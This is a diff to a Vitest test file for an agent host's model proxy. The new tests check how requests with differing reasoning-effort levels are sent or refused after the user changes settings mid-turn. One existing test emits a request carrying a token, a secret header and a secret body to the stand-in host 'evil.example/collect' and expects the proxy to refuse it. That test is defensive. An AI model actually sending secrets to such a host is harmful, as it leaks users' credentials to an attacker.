@@ -1,13 +1,16 @@
-// Spec: specs/agent-proxy.spec.ts (AGENT_PROXY_LIMITS, PROXY_REFUSALS) · specs/agent-tools.spec.ts (MODEL_REQUESTS,
-// isAllowedModelRequest) · specs/agent-protocol.schema.ts (AGENT_PROTOCOL_LIMITS)
-// Acceptance: specs/agent-host.feature.md (Model proxy)
+// Spec: specs/agent-proxy.spec.ts (AGENT_PROXY_LIMITS, PROXY_REFUSALS, checkModelRequest) · specs/agent-tools.spec.ts (MODEL_REQUESTS,
+// isAllowedModelRequest) · specs/agent-protocol.schema.ts (AGENT_PROTOCOL_LIMITS) · specs/agent-reasoning.spec.ts
+// (effectiveEffort, MODEL_REASONING_SUPPORT) · specs/agent-chatgpt.spec.ts (CHATGPT_TOOL_NAMESPACE, ChatgptModelView)
+// Acceptance: specs/agent-host.feature.md (Model proxy, Reasoning) · plan docs/plans/phase-8-ai-complete.md, Task 8a
 import { afterEach, describe, expect, test, vi } from 'vitest';
+import { CHATGPT_TOOL_NAMESPACE, type ChatgptModelView } from '@app/specs/agent-chatgpt.spec';
 import { AGENT_PROTOCOL_LIMITS, MainToRuntimeMessageSchema, type MainToRuntimeMessage } from '@app/specs/agent-protocol.schema';
 import { AGENT_PROXY_LIMITS, type AgentModelSettings } from '@app/specs/agent-proxy.spec';
-import { MODEL_REQUESTS } from '@app/specs/agent-tools.spec';
+import { MODEL_REASONING_SUPPORT } from '@app/specs/agent-reasoning.spec';
+import { ALLOWED_MODEL_IDS, byProvider, MODEL_REQUESTS } from '@app/specs/agent-tools.spec';
 import { createCredentialStore } from '../credentials';
 import type { AgentChatEvent, AgentFetchEvent, AgentHostStatus } from '../host';
-import { createModelProxy, type ProxyFetchFunction, type ProxyRequestInit } from '../model-proxy';
+import { createModelProxy, type ModelProxyChatgpt, type ProxyFetchFunction, type ProxyRequestInit } from '../model-proxy';
 import { createFakeSafeStorage, createMemoryFs, streamOf } from './fakes';
 
 const KEY = 'sk-proxy-test-key-0123456789';
@@ -33,7 +36,18 @@ const request = (overrides: Partial<FetchRequest> = {}): FetchRequest => ({
 
 const sse = (text: string) => new TextEncoder().encode(text);
 
-async function setup(options: { settings?: AgentModelSettings; fetch?: ProxyFetchFunction; key?: boolean; limits?: Partial<typeof AGENT_PROXY_LIMITS>; loadSettings?: () => Promise<void>; now?: () => number } = {}) {
+async function setup(
+  options: {
+    settings?: AgentModelSettings;
+    fetch?: ProxyFetchFunction;
+    key?: boolean;
+    limits?: Partial<typeof AGENT_PROXY_LIMITS>;
+    loadSettings?: () => Promise<void>;
+    now?: () => number;
+    chatgptModels?: readonly ChatgptModelView[];
+    chatgpt?: ModelProxyChatgpt;
+  } = {},
+) {
   const sent: MainToRuntimeMessage[] = [];
   const fetchListeners: ((event: AgentFetchEvent) => void)[] = [];
   const statusListeners: ((status: AgentHostStatus) => void)[] = [];
@@ -69,7 +83,20 @@ async function setup(options: { settings?: AgentModelSettings; fetch?: ProxyFetc
     await credentials.setKey('openai', KEY);
     await credentials.setKey('gateway', KEY);
   }
-  const settings = { current: () => options.settings ?? { route: 'byok-anthropic' as const, modelId: 'anthropic/claude-sonnet-5-5' as const }, load: options.loadSettings ?? (async () => undefined) };
+  let current: AgentModelSettings = options.settings ?? { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5' };
+  const settingsListeners: ((settings: AgentModelSettings, previous: AgentModelSettings) => void)[] = [];
+  const settings = {
+    current: () => current,
+    load: options.loadSettings ?? (async () => undefined),
+    onChange: (listener: (settings: AgentModelSettings, previous: AgentModelSettings) => void) => (settingsListeners.push(listener), () => undefined),
+    chatgptModels: () => options.chatgptModels ?? [],
+  };
+  /** The user changes the settings (the settings' own `onChange`, with the value it replaced). */
+  const switchTo = (next: AgentModelSettings) => {
+    const before = current;
+    current = next;
+    for (const listener of settingsListeners) listener(next, before);
+  };
   const fetch = vi.fn<ProxyFetchFunction>(
     options.fetch ??
       (async () =>
@@ -79,7 +106,7 @@ async function setup(options: { settings?: AgentModelSettings; fetch?: ProxyFetc
         })),
   );
   const log = vi.fn<(line: string) => void>();
-  const proxy = createModelProxy({ host, credentials, settings, fetch, log, ...(options.limits ? { limits: options.limits } : {}), ...(options.now ? { now: options.now } : {}) });
+  const proxy = createModelProxy({ host, credentials, settings, fetch, log, ...(options.limits ? { limits: options.limits } : {}), ...(options.now ? { now: options.now } : {}), ...(options.chatgpt ? { chatgpt: options.chatgpt } : {}) });
   const emit = (event: AgentFetchEvent) => {
     for (const listener of fetchListeners) listener(event);
   };
@@ -91,8 +118,37 @@ async function setup(options: { settings?: AgentModelSettings; fetch?: ProxyFetc
   };
   const of = <T extends MainToRuntimeMessage['type']>(type: T) => sent.filter((message): message is Extract<MainToRuntimeMessage, { type: T }> => message.type === type);
   const ended = (requestId = 'req-1') => vi.waitFor(() => expect(sent.some((message) => 'requestId' in message && message.requestId === requestId && (message.type === 'fetch.end' || message.type === 'fetch.error'))).toBe(true));
-  return { proxy, sent, fetch, log, emit, status, of, ended, strike, chats, chatEvent };
+  /** The answer for `requestId`: `sent` (a fetch was made) or the refusal's reason (`proxy.state().lastRefusal`). */
+  const outcome = async (requestId: string) => {
+    await ended(requestId);
+    return fetch.mock.calls.length > sentBefore(requestId) ? 'sent' : proxy.state().lastRefusal;
+  };
+  const fetchCounts = new Map<string, number>();
+  const sentBefore = (requestId: string) => fetchCounts.get(requestId) ?? 0;
+  /** Emits a request and answers how it ended (`sent`, or the refusal's reason). */
+  const run = async (requestId: string, overrides: Partial<FetchRequest>) => {
+    fetchCounts.set(requestId, fetch.mock.calls.length);
+    emit(request({ requestId, ...overrides }));
+    return outcome(requestId);
+  };
+  return { proxy, sent, fetch, log, emit, status, of, ended, strike, chats, chatEvent, switchTo, run };
 }
+
+/** The runtime's Anthropic request (key route) with the thinking the effort maps to (`auto`: none). */
+const anthropicBody = (effort: 'auto' | 'low' | 'medium' | 'high', model = 'claude-sonnet-5-5') =>
+  JSON.stringify({ model, max_tokens: 64, messages: [{ role: 'user', content: 'Hi' }], stream: true, ...(effort === 'auto' ? {} : { thinking: { type: 'adaptive' }, output_config: { effort } }) });
+const GATEWAY_URL = MODEL_REQUESTS.gateway[0]!.url;
+/** A gateway request for `modelId` with these provider options (beside the runtime's `openai.store: false`). */
+const gatewayRequest = (modelId: string, options: object = {}): Partial<FetchRequest> => ({
+  url: GATEWAY_URL,
+  headers: [['ai-language-model-id', modelId]],
+  body: JSON.stringify({ maxOutputTokens: 64, prompt: [{ role: 'user', content: [{ type: 'text', text: 'Hi' }] }], providerOptions: { openai: { store: false }, ...options } }),
+});
+const turnEnds = (s: { chats: { active: string[] }; chatEvent: (event: AgentChatEvent) => void }) => {
+  s.chats.active = [];
+  s.chatEvent({ type: 'chat.finish', chatId: 'chat-1', finishReason: 'stop', steps: 1, usage: { input: 1, output: 1 } });
+  s.chats.active = ['chat-2'];
+};
 
 afterEach(() => {
   vi.useRealTimers();
@@ -412,5 +468,111 @@ describe('model proxy', () => {
     emit(request({ url: 'https://evil.example/collect?token=abc123', headers: [['x-secret', 'shh']], body: '{"secret":"body"}' }));
     await vi.waitFor(() => expect(of('fetch.error').length).toBe(1));
     expect(log.mock.calls).toEqual([['agent proxy: refused a model request (endpoint)']]);
+  });
+
+  test('proxy-reasoning-change-mid-turn-is-not-the-runtimes-fault', async () => {
+    const s = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'high' } });
+    // A turn runs on High.
+    expect(await s.run('a', { body: anthropicBody('high') })).toBe('sent');
+    // The user switches High → Low: the turn's next step still carries High, and is sent, uncounted.
+    s.switchTo({ route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'low' });
+    expect(await s.run('b', { body: anthropicBody('high') })).toBe('sent');
+    expect(JSON.parse(s.fetch.mock.calls.at(-1)![1].body)).toMatchObject({ thinking: { type: 'adaptive' }, output_config: { effort: 'high' } });
+    // Low is already the settings': a body with it is sent too.
+    expect(await s.run('c', { body: anthropicBody('low') })).toBe('sent');
+    expect(s.strike).not.toHaveBeenCalled();
+    // The next turn must carry Low: High is refused (`reasoning`) and counted.
+    turnEnds(s);
+    expect(await s.run('d', { body: anthropicBody('high') })).toBe('reasoning');
+    expect(s.strike).toHaveBeenCalledTimes(1);
+    expect(await s.run('e', { body: anthropicBody('low') })).toBe('sent');
+    expect(s.fetch).toHaveBeenCalledTimes(4);
+  });
+
+  test('proxy-reasoning-matching-neither-refused', async () => {
+    const s = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'high' } });
+    s.switchTo({ route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'low' });
+    // Neither the turn's level (High) nor the new one (Low): the runtime's fault.
+    expect(await s.run('a', { body: anthropicBody('medium') })).toBe('reasoning');
+    expect(await s.run('b', { body: anthropicBody('auto') })).toBe('reasoning');
+    expect(s.strike).toHaveBeenCalledTimes(2);
+    expect(s.fetch).not.toHaveBeenCalled();
+    expect(s.log).toHaveBeenCalledWith('agent proxy: refused a model request (reasoning)');
+    // With no change at all, any level but the settings' is refused and counted.
+    const still = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'medium' } });
+    expect(await still.run('a', { body: anthropicBody('high') })).toBe('reasoning');
+    expect(await still.run('b', { body: anthropicBody('auto') })).toBe('reasoning');
+    expect(await still.run('c', { body: anthropicBody('medium') })).toBe('sent');
+    expect(still.strike).toHaveBeenCalledTimes(2);
+  });
+
+  test('proxy-model-change-mid-turn-unchanged', async () => {
+    const s = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'high' } });
+    // The model changes too (and the level): a body made for the turn's model is today's `model`, not counted.
+    s.switchTo({ route: 'byok-anthropic', modelId: 'anthropic/claude-opus-5-5', reasoningEffort: 'low' });
+    expect(await s.run('a', { body: anthropicBody('high') })).toBe('model');
+    expect(await s.run('b', { body: anthropicBody('low') })).toBe('model');
+    expect(s.strike).not.toHaveBeenCalled();
+    // The new model with the turn's level is not a previous-settings body: refused `reasoning`, counted.
+    expect(await s.run('c', { body: anthropicBody('high', 'claude-opus-5-5') })).toBe('reasoning');
+    expect(s.strike).toHaveBeenCalledTimes(1);
+    expect(await s.run('d', { body: anthropicBody('low', 'claude-opus-5-5') })).toBe('sent');
+    // A route change likewise.
+    const routed = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'high' } });
+    routed.switchTo({ route: 'gateway', modelId: 'anthropic/claude-sonnet-5-5', reasoningEffort: 'high' });
+    expect(await routed.run('a', { body: anthropicBody('high') })).toBe('endpoint');
+    expect(routed.strike).not.toHaveBeenCalled();
+  });
+
+  test('proxy-unsupported-stored-effort-acts-as-auto', async () => {
+    // A model that offers Auto only (Grok): a stored High sends nothing.
+    for (const modelId of ALLOWED_MODEL_IDS.filter(byProvider('spacexai'))) {
+      expect(MODEL_REASONING_SUPPORT[modelId]).toEqual(['auto']);
+      const s = await setup({ settings: { route: 'gateway', modelId, reasoningEffort: 'high' } });
+      expect(await s.run('a', gatewayRequest(modelId)), modelId).toBe('sent');
+      expect(await s.run('b', gatewayRequest(modelId, { openai: { store: false, reasoningEffort: 'high' } })), modelId).toBe('reasoning');
+      // The same for the settings the turn began on: High → Low on that model, both act as Auto.
+      s.switchTo({ route: 'gateway', modelId, reasoningEffort: 'low' });
+      expect(await s.run('c', gatewayRequest(modelId)), modelId).toBe('sent');
+      expect(await s.run('d', gatewayRequest(modelId, { openai: { store: false, reasoningEffort: 'high' } })), modelId).toBe('reasoning');
+      expect(s.strike).toHaveBeenCalledTimes(2);
+    }
+    // A Gemini model without Medium: a stored Medium sends nothing.
+    for (const modelId of ALLOWED_MODEL_IDS.filter(byProvider('google')).filter((id) => !MODEL_REASONING_SUPPORT[id].includes('medium'))) {
+      const s = await setup({ settings: { route: 'gateway', modelId, reasoningEffort: 'medium' } });
+      expect(await s.run('a', gatewayRequest(modelId)), modelId).toBe('sent');
+      expect(await s.run('b', gatewayRequest(modelId, { google: { thinkingConfig: { thinkingLevel: 'medium' } } })), modelId).toBe('reasoning');
+      // Previous High (offered) → current Medium (Auto there): a High body from the turn is still sent.
+      const p = await setup({ settings: { route: 'gateway', modelId, reasoningEffort: 'high' } });
+      p.switchTo({ route: 'gateway', modelId, reasoningEffort: 'medium' });
+      expect(await p.run('a', gatewayRequest(modelId, { google: { thinkingConfig: { thinkingLevel: 'high' } } })), modelId).toBe('sent');
+      expect(await p.run('b', gatewayRequest(modelId)), modelId).toBe('sent');
+      expect(await p.run('c', gatewayRequest(modelId, { google: { thinkingConfig: { thinkingLevel: 'medium' } } })), modelId).toBe('reasoning');
+    }
+    // A ChatGPT model the account advertises no level for: Auto only.
+    const MODEL = 'chatgpt/gpt-6.1-sol' as const;
+    const chatgpt: ModelProxyChatgpt = { withAccessToken: async (fn) => ({ ok: true, value: await fn('access-token') }), report: () => undefined };
+    const chatgptRequest = (reasoning?: object): Partial<FetchRequest> => ({
+      url: MODEL_REQUESTS.chatgpt[0]!.url,
+      headers: [['user-agent', 'ai-sdk-openai/4.0.104']],
+      body: JSON.stringify({
+        model: 'gpt-6.1-sol',
+        input: [{ role: 'user', content: [{ type: 'input_text', text: 'Hi' }] }],
+        store: false,
+        stream: true,
+        tools: [{ type: 'namespace', name: CHATGPT_TOOL_NAMESPACE.name, description: CHATGPT_TOOL_NAMESPACE.description, tools: [] }],
+        ...(reasoning === undefined ? {} : { reasoning }),
+      }),
+    });
+    const unadvertised = await setup({ settings: { route: 'chatgpt', modelId: MODEL, reasoningEffort: 'high' }, chatgptModels: [{ id: MODEL, label: 'Sol' }], chatgpt });
+    expect(await unadvertised.run('a', chatgptRequest())).toBe('sent');
+    expect(await unadvertised.run('b', chatgptRequest({ effort: 'high' }))).toBe('reasoning');
+    unadvertised.switchTo({ route: 'chatgpt', modelId: MODEL, reasoningEffort: 'low' });
+    expect(await unadvertised.run('c', chatgptRequest())).toBe('sent');
+    expect(await unadvertised.run('d', chatgptRequest({ effort: 'high' }))).toBe('reasoning');
+    // Advertised: the level is the settings'.
+    const advertised = await setup({ settings: { route: 'chatgpt', modelId: MODEL, reasoningEffort: 'high' }, chatgptModels: [{ id: MODEL, label: 'Sol', efforts: ['low', 'high'] }], chatgpt });
+    expect(await advertised.run('a', chatgptRequest({ effort: 'high', summary: 'detailed' }))).toBe('sent');
+    expect(await advertised.run('b', chatgptRequest())).toBe('reasoning');
   });
 });
